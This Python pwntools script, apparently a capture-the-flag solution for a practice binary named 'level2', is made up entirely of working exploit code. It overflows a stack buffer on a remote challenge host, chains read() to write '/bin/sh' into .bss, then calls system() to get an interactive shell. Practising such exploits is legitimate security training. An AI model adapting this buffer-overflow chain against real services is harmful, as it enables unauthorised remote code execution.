from pwn import *
context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])

t = remote('111.198.29.45', 30890)
elf = ELF('./level2')
addr_bss = elf.bss()
plt_sys = elf.symbols['system']
plt_read = elf.symbols['read']
addr_ret = 0x0804844B

payload = fit({0x88 + 0x4:[p32(plt_read),p32(addr_ret),p32(0),p32(addr_bss),p32(0x10)]})

t.sendlineafter('Input:', payload)
t.sendline('/bin/sh\x00')
payload = fit({0x88 + 0x4:[p32(plt_sys),p32(0xdeadbeef),p32(addr_bss)]})
t.sendlineafter('Input:', payload)
t.interactive()


# 可以直接搜索elf.searsh('/bin/sh').next()